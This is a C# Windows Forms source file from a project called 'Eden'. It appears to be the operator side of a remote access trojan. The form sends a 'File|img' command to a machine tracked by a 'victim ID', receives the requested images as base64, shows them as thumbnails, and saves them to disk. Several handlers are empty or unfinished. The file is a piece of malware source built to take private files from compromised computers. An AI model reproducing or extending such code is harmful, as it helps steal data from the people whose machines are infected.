using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileImage : Form
    {
        public clsClient m_clnt { get; set; }
        public string m_szVictimID { get; set; }
        struct stImageItem
        {
            public string szFilename;
            public Image img;
        }
        private ImageList m_ImageList = new ImageList();
        public List<string> m_lsImgFilename { get; set; }

        public frmFileImage(List<string> lsImgFilename)
        {
            InitializeComponent();

            m_lsImgFilename = lsImgFilename;
        }

        private stImageItem fnGetItemTag(ListViewItem item) => (stImageItem)item.Tag;

        void Received(clsClient clnt, string szVictimID, List<string> aMsg)
        {
            if (aMsg[0] == "file")
            {
                if (aMsg[1] == "img")
                {
                    List<List<string>> lsResults = clsTools.EZData.String2TwoDList(aMsg[2]);
                    foreach (var result in lsResults)
                    {
                        string szImgFilename = result[0];
                        int nCode = int.Parse(result[1]);
                        string szMsg = result[2];

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            Image img = clsTools.Base64ToIamge(szMsg);
                            stImageItem st = new stImageItem()
                            {
                                szFilename = szImgFilename,
                                img = img,
                            };

                            ListViewItem item = new ListViewItem(szImgFilename.Split('/').Last());
                            item.Tag = st;
                            item.ImageKey = szImgFilename;

                            Invoke(new Action(() =>
                            {
                                m_ImageList.Images.Add(szImgFilename, img);
                                listView1.Items.Add(item);

                                toolStripProgressBar1.Increment(1);
                                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}/{m_lsImgFilename.Count}]";
                            }));
                        }
                    }
                }
            }
        }

        void fnSaveImage(List<stImageItem> lImage)
        {
            if (lImage.Count == 0)
                return;

            if (lImage.Count == 1)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    lImage.First().img.Save(sfd.FileName);
                }
            }
            else
            {
                FolderBrowserDialog fbd = new FolderBrowserDialog();
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    string szDirPath = fbd.SelectedPath;

                    foreach (var entity in lImage)
                    {
                        string szFilePath = Path.Combine(szDirPath, Path.GetFileName(entity.szFilename));
                        if (File.Exists(szFilePath))
                        {
                            DialogResult dr = MessageBox.Show("Detect file path exists, do you want to overwrite all?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (dr == DialogResult.No)
                            {
                                MessageBox.Show("Save image file task is terminated.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                return;
                            }
                        }

                        entity.img.Save(szFilePath);
                    }
                }
            }
        }

        void fnShowImage(string szFileName, Image img)
        {
            TabPage page = new TabPage(Path.GetFileName(szFileName));
            page.Tag = szFileName;
            tabControl1.TabPages.Add(page);

            PictureBox pb = new PictureBox();
            page.Controls.Add(pb);
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.Image = img;

            tabControl1.SelectedTab = page;
        }

        void setup()
        {
            m_clnt.ServerMessageReceived += Received;

            listView1.View = View.LargeIcon;
            listView1.LargeImageList = m_ImageList;
            m_ImageList.ImageSize = new Size(255, 255);

            toolStripProgressBar1.Maximum = m_lsImgFilename.Count;
            toolStripStatusLabel1.Text = $"Image[0/{m_lsImgFilename.Count}]";

            m_clnt.SendVictim(m_szVictimID, "File|img|" + clsTools.EZData.OneDList2String(m_lsImgFilename));
        }

        private void frmFileImage_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmFileImage_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }

        //Image.SaveSelected
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
            {
                List<ListViewItem> lItem = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                if (lItem.Count == 0)
                    return;


            }
            else
            {
                //Save current selected tabpage.
            }
        }

        //Image.SaveAll
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> lItem = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (lItem.Count == 0)
                return;

            var tag = fnGetItemTag(lItem.First());
            fnShowImage(tag.szFilename, tag.img);
        }

        //Image.ShowSelected
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
             listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x));
        }
        //Image.ShowAll
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }
    }
}
